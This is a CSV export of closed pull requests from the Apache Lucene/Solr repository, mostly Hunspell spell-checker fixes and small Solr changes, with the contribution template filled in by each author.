"#","No","Issue Title","Issue Details","State","Labels","User name","created","Updated"
"","2640","SOLR-15974: Remove Calcite's ENUMERABLE_AGGREGATE_RULE as Solr only s…","…upports push-down for LogicalAggregate backport of https://github.com/apache/solr/pull/628","closed","","thelabdude","2022-02-12T17:25:30Z","2022-02-12T18:57:00Z"
"","2111","SOLR-8673 Enable custom aggregate functions by opening up FacetContex…","…t field access.    * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Enable custom aggregate functions by opening up FacetContext field access.  # Solution  Prior to this change, it was not feasible to write a custom aggregate function in plugin code because the FacetContext class did not expose its fields for access outside its package. Also some of the useful abstract classes for SlotAcc were package-private too  # Tests  Includes a (suggested) unit test to confirm that a subclass of AggValueSource can be written outside of the org.apache.solr.search.facet package.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","timatbw","2020-12-01T11:26:35Z","2020-12-07T06:45:10Z"
"","2347","LUCENE-9760: Hunspell: print total memory usage in TestAllDictionarie…","…s, cleanup   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  We'd like Hunspell dictionaries not to take too much memory, especially when there's many of them loaded  # Solution  Print the memory usage of all known dictionaries together  # Tests  A test-only change  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-10T16:43:16Z","2021-02-11T08:29:02Z"
"","1997","SOLR-14940: Add ability to remove SolrCore.closeHooks. Keep reference…","…s to CloseHooks in ReplicationHandler and remove them on ReplicationHandler.shutdown()   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","anverus","2020-10-16T18:16:34Z","2020-10-27T21:45:28Z"
"","2370","LUCENE-9772: Hunspell: CHECKCOMPOUNDCASE shouldn't prohibit dash-sepa…","…rated uppercase compounds   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Dutch words like `kandidaat-Kamerlid` weren't allowed  # Solution  Replicate Hunspell's logic of allowing mixed compound case if another char on the border is dash  # Tests  Added to `checkcompoundcase`   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-15T13:20:18Z","2021-02-15T19:27:33Z"
"","1927","SOLR-12987: Deprecated plugins are logged once and with log category …","…org.apache.solr.DEPRECATED  https://issues.apache.org/jira/browse/SOLR-12987","closed","","dsmiley","2020-09-28T21:22:44Z","2020-10-01T12:32:24Z"
"","2375","LUCENE-9775: Hunspell: make FORCEUCASE work when the first compound w…","…ord is inherently title-case   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Now it wouldn't work for Dutch `Jupiter`+`straat`=`Jupiterstraat`  # Solution  When the case is non-varied, check the first letter of the whole compound. Make sure the `CharsRef` still holds it.  # Tests  `forceucase` expanded  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-15T19:50:27Z","2021-02-17T09:00:54Z"
"","2286","LUCENE-9720: Hunspell: more ways to vary misspelled word variations f…","…or suggestions   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Work on Hunspell suggestions in progress.  # Solution  Reimplement most of Hunspell's `suggest` logic, without ngrams so far.  # Tests  Several tests from Hunspell repo.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-01T19:05:02Z","2021-02-03T17:29:14Z"
"","2335","LUCENE-9753: Hunspell: disallow compounds with parts present in dicti…","…onary, space-separated   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Don't accept `compoundword` when there's `compound word` in the dictionary  # Solution  Like Hunspell, handle this near CHECKCOMPOUNDREP pattern check  # Tests  `wordpair` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-09T13:30:10Z","2021-02-10T08:28:41Z"
"","2330","LUCENE-9748: Hunspell: suggest inflected dictionary entries similar t…","…o the misspelled word   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  A follow up of the ""ngram"" suggestion support that adds single prefixes and suffixes to dictionary entries to get better suggestions  # Solution  Copy Hunspell's logic, extract some common code for FST traversal  # Tests  `allcaps.sug` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-09T08:18:31Z","2021-02-10T08:29:07Z"
